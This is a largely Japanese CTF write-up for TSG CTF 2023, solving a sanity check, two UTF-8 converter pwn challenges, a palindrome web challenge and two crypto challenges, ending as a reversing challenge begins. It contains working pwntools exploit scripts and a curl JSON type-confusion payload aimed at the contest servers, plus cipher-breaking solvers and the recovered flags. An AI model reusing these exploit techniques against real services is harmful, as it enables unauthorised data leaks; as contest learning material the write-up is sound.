# TSG CTF 2023 write-up

> 原文: https://www.ctfiot.com/143595.html
> ID: 143595


```
RULES
Don’t prevent other teams from having fun.
Don’t share flags or hints, or you’ll be banned.
Don’t attack (e.g. DoS) our infrastructure, or you’ll be banned.
Don’t do automated scanning. It will be considered to be DoS.
The flag format is TSGCTF{blahblah}, unless otherwise specified.
The prize will be paid with PayPal. If it doesn't suit you, we can pay that in BitCoin at an arbitrary exchange rate we determine.
The teams must publish the writeups of the solved problems in CTFTime to get their prizes.
The number of members in a team is unlimited.
People who belong to TSG are not allowed to participate in TSG CTF.

SUPPORT
If you have issue with TSG CTF, please contact us by joining official Discord server, and clicking "Create Ticket" button in the #ask-admin channel.

ABOUT “BEGINNER” CHALLENGES
If you are unfamiliar with CTF, we highly recommend you to first take a look at the challenges with "beginner" tag. They will be released at the same time as the CTF launch.

In TSG CTF, Beginner's tasks are not "beginner-level challenges." We define a beginner's task as a challenge that does not require any experience or knowledge specific to CTF, but can be solved with knowledge that even a beginner has. Please don't be discouraged if you can't solve a "beginner's task". At times it can be hard!

RELEASE SCHEDULE
Disclaimer: This schedule is tentative. We will make the best effort to deliver these challenges as planned. However any changes are expected anytime.
(省略)
c:\>ver

Microsoft Windows [Version 10.0.19045.3636]

c:\>wsl -l -v
 NAME STATE VERSION
* Ubuntu-22.04 Running 2
 kali-linux Stopped 2
 docker-desktop-data Running 2
 docker-desktop Stopped 2

c:\>
$ cat /proc/version
Linux version 5.15.90.1-microsoft-standard-WSL2 (oe-user@oe-host) (x86_64-msft-linux-gcc (GCC) 9.3.0, GNU ld (GNU Binutils) 2.34.0.20200220) #1 SMP Fri Jan 27 02:56:13 UTC 2023
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ python3 --version
Python 3.10.12
$ python3 -m pip show pip | grep Version
Version: 22.0.2
$ python3 -m pip show pwntools | grep Version
Version: 4.11.0
$ python3 -m pip show z3-solver | grep Version
Version: 4.8.16.0
$ gdb --version
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
$ cat ~/peda/README | grep -e 'Version: ' -e 'Release: '
Version: 1.0
Release: special public release, Black Hat USA 2012
$ strace --version
strace -- version 5.16
Copyright (c) 1991-2022 The strace developers <https://strace.io>.
This is free software; see the source for copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Optional features enabled: stack-trace=libunwind stack-demangle m32-mpers mx32-mpers
$ curl --version
curl 7.81.0 (x86_64-pc-linux-gnu) libcurl/7.81.0 OpenSSL/3.0.2 zlib/1.2.11 brotli/1.0.9 zstd/1.4.8 libidn2/2.3.2 libpsl/0.21.0 (+libidn2/2.3.2) libssh/0.9.6/openssl/zlib nghttp2/1.43.0 librtmp/2.3 OpenLDAP/2.5.16
Release-Date: 2022-01-05
Protocols: dict file ftp ftps gopher gophers http https imap imaps ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets zstd
$
TSG CTF のDiscordサーバーにログインして↓の場所に書いてあるフラグを送信してください。
(ここにDiscordチャンネルのスクリーンショット)
mikit — Today at 3:45 PM
@everyone Welcome to TSG CTF Discord!

This Discord server is not a place to collaborate with other people to solve challenges. Do not put any hint for challenge or solution in any message. Be fair!
Be polite and respect others.
glhf!

Transparent Release Policy

This time we disclosed the release time of each challenges before the contest. It will be important for you to check it out. See here:
https://score.ctf.tsg.ne.jp/rules

Support

If you have issue with TSG CTF, please contact us by clicking "Create Ticket" button in the #⁠ask-admin channel.

Beginner's Tasks

As you can see there are challenges tagged with beginner, which is truly designed for beginners! While they may not be trivial, they require less CTF expertise. Try harder and get the flag!

Sanity Check

Here is your sanity 🙂

TSGCTF{G3n3r@t1v3_@I_4lways_c0mes_up_w1th_b3tt3r_punchl1n3s_th@n_m3!}
# -*- speaking: utf-8 -*-

nc 34.146.195.242 40002

初心者向けヒント:

まず、添付ファイルをダウンロードしてソースコードを見てください。
添付ファイル内のflag.txtは偽物です！問題サーバーにあるものとは異なります。
あなたがすべきことは、フラグを推測すること...ではなくフラグをリークさせることです。つまりただクイズに答えるのではなく何か特別なことをしてください。
怪しい関数の仕様を調べてみてください。
$ file *
Makefile: makefile script, ASCII text
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=bc06581d875959a12c1a58c826ac31c0e4bf0cbe, for GNU/Linux 3.2.0, not stripped
flag.txt: ASCII text, with no line terminators
main.c: C source, Unicode text, UTF-8 text
$
(略)
    #define MAX_FLAG_CHARS 31

char utf32_hexstr[3][MAX_FLAG_CHARS * 8 + 1];
char utf8_bin[MAX_FLAG_CHARS * 4 + 1];
char flag_buffer[MAX_FLAG_CHARS + 1];
int main() {
 (略)
 char* locale = setlocale(LC_CTYPE, "C.utf8");
 printf("Note: My locale is %s\n", locale);
 (略)
 for (int q = 0; q < 3; q++) {
 char32_t wc = 0;
 mbstate_t ps = {0};
 char* utf8_ptr = utf8_bin;
 for (int i=0; utf32_hexstr[q] != 0; i++) {
 char c = utf32_hexstr[q][i];
 if (i % 8 == 0) wc = 0;

 if (c >= '0' && c <= '9') wc += c - '0';
 else if (c >= 'a' && c <='f') wc += c - 'a' + 10;
 else if (c >= 'A' && c <='F') wc += c - 'A' + 10;
 else break;

 if (i % 8 == 7) {
 utf8_ptr += c32rtomb(utf8_ptr, wc, &ps);
 } else {
 wc *= 16;
 }
 }

 printf("Q%d: ", q+1);
 if (strcmp(utf8_bin, ans_strings[q]) == 0) {
 correct++;
 printf("Correct! ");
 } else {
 printf("Wrong :( ");
 }
 printf("Your input: %s\n", utf8_bin);
 }
 (略)
}
.bss:
0000000000004040 public utf32_hexstr
.bss:
0000000000004040 ; char utf32_hexstr[3][249]
.bss:
0000000000004040 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? utf32_hexstr db 300h dup(?) ; DATA XREF: main+164↑o
.bss:
0000000000004040 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??… ; main+1F6↑o
.bss:
0000000000004340 public utf8_bin
.bss:
0000000000004340 ; char utf8_bin[125]
.bss:
0000000000004340 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? utf8_bin db 80h dup(?) ; DATA XREF: main+1C3↑o
.bss:
0000000000004340 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??… ; main+2D0↑o ...
.bss:
00000000000043C0 public flag_buffer
.bss:
00000000000043C0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? flag_buffer db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
.bss:
00000000000043C0 ; DATA XREF: main+52↑o
.bss:
00000000000043C0 ; main+AB↑o
.bss:
00000000000043CB ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
.bss:
00000000000043D6 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
#!/usr/bin/env python3
import pwn

BIN_PATH = "./chall"
pwn.context.terminal = ['wt.exe', "--window", "gdb_debug", "wsl"]
pwn.context.binary = BIN_PATH
# pwn.context.log_level = "debug"

def pad_payload(payload):
 if len(payload) > 248: raise Exception(f"{len(payload) = }")
 if len(payload) < 248:
 payload += b"\n"
 return payload

def solve(io):
 invalid_codepoint_hex = b"FFFFFFFF" # c32rtomb関数が-1を返すもの
 long_in_utf8_codepoint_hex = b"0001f680" # ロケットの絵文字、utf-8で4バイト
 digit_0_codepoint_hex = b"00000030" # ord("0")
 digit_for_rocket_hex = "".join(map(lambda b: f"{b:
08x}",long_in_utf8_codepoint_hex)).encode()
 print(f"{digit_for_rocket_hex = }")

 io.sendafter(
 b"Q1: What is the code of the rocket emoji in utf32be? (hexstring)>",
 pad_payload((invalid_codepoint_hex * 22) + (digit_for_rocket_hex * 1 + digit_0_codepoint_hex * 1)))

 io.sendafter(
 b"Q2: What is the code of the fox emoji in utf32be? (hexstring)>",
 pad_payload((invalid_codepoint_hex * 13) + (digit_for_rocket_hex * 1 + digit_0_codepoint_hex * 5)))

 io.sendafter(
 b"Q3: Guess the flag in utf32be. (hexstring)>",
 pad_payload(long_in_utf8_codepoint_hex * 31))
 print(io.recvall().decode())

# with pwn.process(BIN_PATH) as io: solve(io)
with pwn.remote("34.146.195.242", 40002) as io: solve(io)
# COMMANDS = """
# b *(main+0x32A)
# continue
# """
# with pwn.gdb.debug(BIN_PATH, COMMANDS) as io: solve(io)
$ ./solve.py
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
[*] '/mnt/d/Documents/work/ctf/TSG_CTF_2023/converter/chall'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[+] Opening connection to 34.146.195.242 on port 40002: Done
digit_for_rocket_hex = b'0000003000000030000000300000003100000066000000360000003800000030'
[+] Receiving all data: Done (290B)
[*] Closed connection to 34.146.195.242 port 40002

Result announcement 🥳🥳
Q1: Wrong :( Your input:
Q2: Wrong :( Your input:
Q3: Wrong :( Your input: 🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀ὨCTF{NoEmojiHereThough:
cry:}
Score 0/3. Try harder!

$
Now I'm calling from the Alps.

nc 34.146.195.242 40004

初心者向けヒント:

まず、添付ファイルをダウンロードしてソースコードを見てください。
添付ファイル内のflag.txtは偽物です！問題サーバーにあるものとは異なります。
あなたがすべきことは、フラグを推測すること...ではなくフラグをリークさせることです。つまりただクイズに答えるのではなく何か特別なことをしてください。
怪しい関数の仕様を調べてみてください。
$ file *
Dockerfile: ASCII text
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
flag.txt: ASCII text, with no line terminators
main.c: C source, Unicode text, UTF-8 text
$ pwn checksec chall
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
[*] '/mnt/d/Documents/work/ctf/TSG_CTF_2023/converter2/chall'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
$ diff main.c ../converter/main.c
$ diff chall ../converter/chall
Binary files chall and ../converter/chall differ
$
$ ls -AlF chall
-rwxrwxrwx 1 tan tan 18800 Nov 4 16:00 chall*
$ ./chall
sh: 1: ./chall: not found
$ strace ./chall
execve("./chall", ["./chall"], 0x7fff17c4cbb0 /* 24 vars */) = -1 ENOENT (No such file or directory)
strace: exec: No such file or directory
+++ exited with 1 +++
$ pwn checksec chall
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
[*] '/mnt/d/Documents/work/ctf/TSG_CTF_2023/converter2/chall'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
$
$ ./solve.py
[!] Could not populate PLT: module 'unicorn' has no attribute 'UC_ARCH_RISCV'
[*] '/mnt/d/Documents/work/ctf/TSG_CTF_2023/converter2/chall'
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: PIE enabled
[+] Opening connection to 34.146.195.242 on port 40004: Done
digit_for_rocket_hex = b'0000003000000030000000300000003100000066000000360000003800000030'
[+] Receiving all data: Done (290B)
[*] Closed connection to 34.146.195.242 port 40004

Result announcement 🥳🥳
Q1: Wrong :( Your input:
Q2: Wrong :( Your input:
Q3: Wrong :( Your input: 🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀ὨCTF{IdidntknowUTF8isupto6!}
Score 0/3. Try harder!

$
設定が正しいか、413回チェックしました。

http://34.84.176.251:
12349

初心者向けヒント
とりあえず、上のリンクを開いて、適当に操作してみてください。この問題は「非常に長い回文」をサーバーに送ることでフラグが手に入ると主張していますが、話はそんなに単純ではないことがすぐに分かります。
次に、添付したソースコードを読んでください。main.mjs や nginx.conf といったファイルにこのウェブサイトの重要なロジックが記述されています。flag という変数にフラグが保存されているので、この値をリークすることが目的となります。
これらのヒントを元に、「非常に長い回文」をサーバーに送るのではなく、何かしらのバグを突くことによってフラグを手に入れる方法を考えましょう。Web技術、特にJavaScriptについての知識が必要になるかもしれないので、必要に応じてMDNなどのドキュメントを参照してください。
なお、この問題を解くのに大量のアクセスをする必要はありません。ルールに書かれている通り、DoS まがいの大量アクセスはご遠慮ください。
$ file *
compose.yaml: ASCII text
index.html: HTML document, ASCII text
main.mjs: Java source, ASCII text
nginx.conf: ASCII text
package-lock.json: JSON data
package.json: JSON data
$
import {serve} from '@hono/node-server';
import {serveStatic} from '@hono/node-server/serve-static';
import {Hono} from 'hono';

const flag = process.env.FLAG ?? 'DUMMY{DUMMY}';

const validatePalindrome = (string) => {
 if (string.length < 1000) {
 return 'too short';
 }

 for (const i of Array(string.length).keys()) {
 const original = string[i];
 const reverse = string[string.length - i - 1];

 if (original !== reverse || typeof original !== 'string') {
 return 'not palindrome';
 }
 }

 return null;
}

const app = new Hono();

app.get('/', serveStatic({root: '.'}));

app.post('/', async (c) => {
 const {palindrome} = await c.req.json();
 const error = validatePalindrome(palindrome);
 if (error) {
 c.status(400);
 return c.text(error);
 }
 return c.text(`I love you! Flag is ${flag}`);
});

app.port = 12349;

serve(app);
events {
 worker_connections 1024;
}

http {
 server {
 listen 0.0.0.0:
12349;
 client_max_body_size 100;
 location / {
 proxy_pass http://app:
12349;
 proxy_read_timeout 5s;
 }
 }
}
$ curl 'http://34.84.176.251:
12349/' -H 'Content-Type: application/json' --data-raw '{"palindrome":{"length":"1000","0":"0","999":"0"}}'
I love you! Flag is TSGCTF{pilchards_are_gazing_stars_which_are_very_far_away}
$
フラグの内容はユニークにしたほうがいい問題になるって聞きました。
$ file *
encrypt.py: Python script, ASCII text executable
output.txt: ASCII text, with very long lines (19805)
$
from Crypto.Util.number import getPrime

p = getPrime(1024)
q = getPrime(1024)
N = p * q
e = 0x10001

with open('flag.txt', 'rb') as f:
 flag = f.read()

assert len(flag) == 33

flag_header = flag[:7] # TSGCTF{
flag_content = flag[7:-1]
flag_footer = flag[-1:] # }

assert len(flag_content) == len({byte for byte in flag_content}) # flag_content is unique

c_list = [pow(byte, e, N) for byte in flag]
clues = [x * y % N for x, y in zip(c_list[:-1], c_list[1:])]
clues.sort()

print(f'N = {N}')
print(f'e = {e}')
print(f'clues = {clues}')
#!/usr/bin/env python3

import ast
import sys

with open("output.txt") as f:
 N = ast.literal_eval(f.readline().split(" = ")[1])
 e = ast.literal_eval(f.readline().split(" = ")[1])
 clues = ast.literal_eval(f.readline().split(" = ")[1])

candidates = range(0x20, 0x7f)
c_list = [(pow(byte, e, N), byte) for byte in candidates]

current = ord("T")
flag_content = []
for (x, v1) in c_list:
 for (y, v2) in c_list:
 if v1 == v2:
 continue
 clue = x * y % N
 if clue in clues:
 print(f"{chr(v1)} -> {chr(v2)}")
 flag_content.append((v1, v2))

def dfs(used, current, depth)->str:
 # print(f"{depth=}, {chr(current) = }")
 if depth == 33 and current == ord("}"):
 return chr(current)
 for (v1, v2) in flag_content:
 if v1 != current: continue
 if v2 in used: continue

 used.add(v2)
 result = dfs(used, v2, depth+1)
 if result is not None:
 return chr(current) + result
 used.remove(v2)
 return None

used = set()
known = "TSGCTF{" # 先頭7文字を固定しないと「TCGSTsI,KO{FMHi5A_un1qUe-flag?XD}」などが出てきてしまいました
for k in known:
 used.add(k)
flag = known[:-1] + dfs(set(), ord(known[-1]), len(known))
print(flag)
$ ./solve.py
! -> d
, -> I
, -> K
, -> ~
- -> e
- -> f
0 -> ~
1 -> n
1 -> q
1 -> x
2 -> B
3 -> Z
5 -> A
5 -> i
6 -> U
6 -> p
7 -> <
7 -> b
8 -> c
8 -> i
8 -> l
< -> 7
< -> b
< -> ~
? -> X
? -> `
? -> g
? -> x
A -> 5
A -> _
B -> 2
B -> T
C -> G
C -> T
D -> X
D -> }
F -> M
F -> T
F -> l
F -> {
G -> C
G -> S
H -> M
H -> T
H -> i
I -> ,
I -> s
K -> ,
K -> O
M -> F
M -> H
O -> K
O -> {
R -> i
S -> G
S -> T
T -> B
T -> C
T -> F
T -> H
T -> S
T -> Z
T -> s
U -> 6
U -> d
U -> e
U -> q
X -> ?
X -> D
Z -> 3
Z -> T
\ -> i
_ -> A
_ -> u
` -> ?
a -> g
a -> l
b -> 7
b -> <
c -> 8
d -> !
d -> U
e -> -
e -> U
f -> -
f -> l
g -> ?
g -> a
i -> 5
i -> 8
i -> H
i -> R
i -> \
l -> 8
l -> F
l -> a
l -> f
n -> 1
n -> u
p -> 6
q -> 1
q -> U
s -> I
s -> T
u -> _
u -> n
x -> 1
x -> ?
{ -> F
{ -> O
} -> D
~ -> ,
~ -> 0
~ -> <
TSGCTF{OK,IsTHi5A_un1qUe-flag?XD}
$
これは私のシンプルなストリーム暗号です。突破できますか？
$ file *
encrypt.py: ASCII text
output.py: Unicode text, UTF-8 (with BOM) text, with very long lines (1405)
README.md: Unicode text, UTF-8 text, with no line terminators
$ cat README.md
解答者に配布するソースコードなどのファイルをここに置く
$
import secrets
import hashlib
import base64
import re

pattern = re.compile("[a-zA-Z0-9!-/:-?\[-`|~]+")
flag_content = b"@@REDUCTED@@"
assert pattern.fullmatch(flag_content.decode())

flag_hash = hashlib.md5(flag_content).digest()
flag = b"TSGCTF{"+flag_content+b"@"+base64.b64encode(flag_hash)+b"}"

key_stream = list(secrets.token_bytes(16))
encrypted_flags = [flag[i]^key_stream[i%16] for i in range(len(flag))]

print("cipher =",encrypted_flags)
print("flag_length =",len(flag))
#!/usr/bin/env python3

import z3
import ast
import string
import re
import hashlib
import base64

with open("output.py") as f:
 cipher = ast.literal_eval(f.readline().split(" = ")[1])
 flag_length = ast.literal_eval(f.readline().split(" = ")[1])
 assert flag_length == 304

flag_prefix = "TSGCTF{"
# size_md5_digest = 16
size_md5_digest_base64 = 24 # b'CY9rzUYh03PK3k6DJie09g=='等、後ろ2文字は=になるはず
size_flag_content = flag_length - (len(flag_prefix) + len("@") + size_md5_digest_base64 + len("}"))
solver = z3.Solver()
keys = [z3.BitVec(f"key_stream_{i:
02d}", 8) for i in range(16)]

def add_key_range(c, candidates:
str):
 solver.add(0x21 <= c)
 solver.add(c <= 0x7e)
 for i in range(0x20, 0x7f):
 if chr(i) not in candidates:
 solver.add(c != i)
pattern = re.compile("[a-zA-Z0-9!-/:-?\[-`|~]+")
pattern_candidates = ""
for i in range(0x20, 0x7f):
 if pattern.fullmatch(chr(i)):
 pattern_candidates += chr(i)
print(f"{pattern_candidates = }")

# フラグ先頭箇所
for (i, v) in enumerate(flag_prefix):
 solver.add(keys[i % len(keys)] ^ ord(flag_prefix[i]) == cipher[i])

# flag_content箇所
for i in range(size_flag_content):
 offset_cipher = len(flag_prefix) + i
 offset_key = offset_cipher % len(keys)
 c = keys[offset_key] ^ cipher[offset_cipher]
 add_key_range(c, pattern_candidates)

# @箇所
offset_atmark = len(flag_prefix) + size_flag_content
solver.add(keys[offset_atmark % len(keys)] ^ ord("@") == cipher[offset_atmark])

# base64箇所
for i in range(size_md5_digest_base64):
 offset_cipher = len(flag_prefix) + size_flag_content + len("@") + i
 offset_key = offset_cipher % len(keys)
 c = keys[offset_key] ^ cipher[offset_cipher]
 if i + 2 < size_md5_digest_base64:
 add_key_range(c, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
 else:
 add_key_range(c, "=")

# 最後
offset_closing = flag_length - 1
solver.add(keys[offset_closing % len(keys)] ^ ord("}") == cipher[offset_closing])

try_count = 0
while True:
 try_count += 1
 if try_count % 100 == 0:
 print(try_count)
 if solver.check() != z3.sat:
 raise Exception("Can not solve...")

 model = solver.model()
 secret = []
 for key in keys:
 secret.append(model[key].as_long())
 # print(f"{secret = }")
 flag = ""
 for (i, v) in enumerate(cipher):
 flag += chr(v ^ secret[i % len(secret)])

 # ↓break条件検証用
 # flag = "TSGCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@imCnzn5osIF808i4bROFMg==}"
 flag_content = flag[len(flag_prefix) : len(flag_prefix)+size_flag_content]
 flag_md5_base64 = flag[-(size_md5_digest_base64+1) : -1]
 # print(flag_content)
 # print(flag_md5_base64)
 if base64.b64encode(hashlib.md5(flag_content.encode()).digest()) == flag_md5_base64.encode():
 print(flag)
 print("Solved!")
 break
 # 同じ解を出さないための制約を追加 https://stackoverflow.com/questions/11867611/z3py-checking-all-solutions-for-equation/70656700#70656700
 block = []
 for i in range(len(keys)):
 block.append(keys[i] != secret[i])
 solver.add(z3.Or(block))
$ time ./solve.py
(略)
143600
143700
TSGCTF{The_l0n63|2_+|-|3_fla6_the_saf3|2_i+_m4`/_8e_as_lo|\|g_4$_you_use_a|\|_a|*pr0|*ria+3_3|\|cry|*+i0n._Thi$_ci|*|-|3r_i$_4_0ne_+i|\/|e_|*a|)_ra+h3|2_t|-|4|\|_a_s+re4m_(iph3r,_but_it_i$_ins3(u|2e_be(ause_it_us3s_the_$4|\/|e_r4ndom_num83r$_re|*34+3|)ly._enjoy_hahaha_:-)-:)-:)@TWp6sQXidRLICfdhOMY+IA==}
Solved!
./solve.py 7308.84s user 1.57s system 99% cpu 2:01:50.50 total
$
// 左6列が探索対象、右10列は完全固定
VmoFl+ n63|2_+|-|
1Zlua- _the_saf3|
0Zc2_v 4`/_8e_as_
njvE|| _4$_you_us
gZke\g _a|*pr0|*r
kd!*_( |\|cry|*+i
2k$FTs i$_ci|*|-|
1wUp$D 4_0ne_+i|\
-yoF|1 a|)_ra+h3|
0Z~e-g 4|\|_a_s+r
g1gF(r ph3r,_but_
kqUp$D ins3(u|2e_
``"xuh e_it_us3s_
vmoF$/ |\/|e_r4nd
mhUwuv 83r$_re|*3
6.9e)w y._enjoy_h
cmkqaD :-)-:)-:)
#!/usr/bin/env python3

import z3
import ast
import string
import re
import hashlib
import base64
import itertools

with open("output.py") as f:
 cipher = ast.literal_eval(f.readline().split(" = ")[1])
 flag_length = ast.literal_eval(f.readline().split(" = ")[1])
 assert flag_length == 304

flag_prefix = "TSGCTF{"
# size_md5_digest = 16
size_md5_digest_base64 = 24 # b'CY9rzUYh03PK3k6DJie09g=='等、後ろ2文字は=になるはず
size_flag_content = flag_length - (len(flag_prefix) + len("@") + size_md5_digest_base64 + len("}"))
solver = z3.Solver()
keys = [z3.BitVec(f"key_stream_{i:
02d}", 8) for i in range(16)]

def add_key_range(c, candidates:
str):
 solver.add(0x21 <= c)
 solver.add(c <= 0x7e)
 for i in range(0x20, 0x7f):
 if chr(i) not in candidates:
 solver.add(c != i)
pattern = re.compile("[a-zA-Z0-9!-/:-?\[-`|~]+")
pattern_candidates = ""
for i in range(0x20, 0x7f):
 if pattern.fullmatch(chr(i)):
 pattern_candidates += chr(i)
print(f"{pattern_candidates = }")

# フラグ先頭箇所
for (i, v) in enumerate(flag_prefix):
 solver.add(keys[i % len(keys)] ^ ord(flag_prefix[i]) == cipher[i])

# flag_content箇所
for i in range(size_flag_content):
 offset_cipher = len(flag_prefix) + i
 offset_key = offset_cipher % len(keys)
 c = keys[offset_key] ^ cipher[offset_cipher]
 add_key_range(c, pattern_candidates)

# @箇所
offset_atmark = len(flag_prefix) + size_flag_content
solver.add(keys[offset_atmark % len(keys)] ^ ord("@") == cipher[offset_atmark])

# base64箇所
for i in range(size_md5_digest_base64):
 offset_cipher = len(flag_prefix) + size_flag_content + len("@") + i
 offset_key = offset_cipher % len(keys)
 c = keys[offset_key] ^ cipher[offset_cipher]
 if i + 2 < size_md5_digest_base64:
 add_key_range(c, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
 else:
 add_key_range(c, "=")

# 最後
offset_closing = flag_length - 1
solver.add(keys[offset_closing % len(keys)] ^ ord("}") == cipher[offset_closing])

# 文章からフラグエスパー
solver.add(keys[len(flag_prefix)] ^ cipher[len(flag_prefix) + (16*8)] == ord("/"))
solver.add(keys[len(flag_prefix)+1] ^ cipher[len(flag_prefix) + (16*8)+1] == ord("|"))

try_count = 0
while True:
 try_count += 1
 if try_count % 100 == 0:
 print(try_count)
 if solver.check() != z3.sat:
 raise Exception("Can not solve...")

 model = solver.model()
 secret = []
 for key in keys:
 secret.append(model[key].as_long())
 print(f"{secret = }")
 flag = ""
 for (i, v) in enumerate(cipher):
 flag += chr(v ^ secret[i % len(secret)])

 # ↓break条件検証用
 # flag = "TSGCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@imCnzn5osIF808i4bROFMg==}"
 flag_content = flag[len(flag_prefix) : len(flag_prefix)+size_flag_content]
 flag_md5_base64 = flag[-(size_md5_digest_base64+1) : -1]

 def chunks(lst, n):
 """Yield successive n-sized chunks from lst."""
 for i in range(0, len(lst), n):
 yield lst[i:i + n]
 print(flag)
 for chunk in chunks(flag_content, 16):
 print(chunk)
 print(flag_md5_base64)
 if base64.b64encode(hashlib.md5(flag_content.encode()).digest()) == flag_md5_base64.encode():
 print(flag)
 print("Solved!")
 break
 # 同じ解を出さないための制約を追加 https://stackoverflow.com/questions/11867611/z3py-checking-all-solutions-for-equation/70656700#70656700
 block = []
 for i in range(len(keys)):
 block.append(keys[i] != secret[i])
 solver.add(z3.Or(block))
$ time ./solve_esper.py
(略)
secret = [247, 176, 17, 0, 156, 72, 203, 232, 13, 179, 42, 62, 83, 41, 241, 70]
TSGCTF{The_l0n63|2_+|-|3_fla6_the_saf3|2_i+_m4`/_8e_as_lo|\|g_4$_you_use_a|\|_a|*pr0|*ria+3_3|\|cry|*+i0n._Thi$_ci|*|-|3r_i$_4_0ne_+i|\/|e_|*a|)_ra+h3|2_t|-|4|\|_a_s+re4m_(iph3r,_but_it_i$_ins3(u|2e_be(ause_it_us3s_the_$4|\/|e_r4ndom_num83r$_re|*34+3|)ly._enjoy_hahaha_:-)-:)-:)@TWp6sQXidRLICfdhOMY+IA==}
The_l0n63|2_+|-|
3_fla6_the_saf3|
2_i+_m4`/_8e_as_
lo|\|g_4$_you_us
e_a|\|_a|*pr0|*r
ia+3_3|\|cry|*+i
0n._Thi$_ci|*|-|
3r_i$_4_0ne_+i|\
/|e_|*a|)_ra+h3|
2_t|-|4|\|_a_s+r
e4m_(iph3r,_but_
it_i$_ins3(u|2e_
be(ause_it_us3s_
the_$4|\/|e_r4nd
om_num83r$_re|*3
4+3|)ly._enjoy_h
ahaha_:-)-:)-:)
TWp6sQXidRLICfdhOMY+IA==
TSGCTF{The_l0n63|2_+|-|3_fla6_the_saf3|2_i+_m4`/_8e_as_lo|\|g_4$_you_use_a|\|_a|*pr0|*ria+3_3|\|cry|*+i0n._Thi$_ci|*|-|3r_i$_4_0ne_+i|\/|e_|*a|)_ra+h3|2_t|-|4|\|_a_s+re4m_(iph3r,_but_it_i$_ins3(u|2e_be(ause_it_us3s_the_$4|\/|e_r4ndom_num83r$_re|*34+3|)ly._enjoy_hahaha_:-)-:)-:)@TWp6sQXidRLICfdhOMY+IA==}
Solved!
./solve_esper.py 3.06s user 0.25s system 99% cpu 3.346 total
$
一つ一つ対処していくとしよう。

初心者向けのヒント:

GhidraやIDA Freeなどで全体の処理を見てみよう
x64dbgやWindbgを使って動かしてみよう
暗号化の方式ややっている処理はググれば出てくるかも？
入力した文字列は最終的に何と比べられているのだろう
各処理を元に戻していこう
$ file *
beginners-rev-2023.exe: PE32+ executable (console) x86-64, for MS Windows
$
00000000 EncryptionContext struc ; (sizeof=0x408, mappedto_34)
00000000 dwSomething0 dd ?
00000004 dwSomething4 dd ?
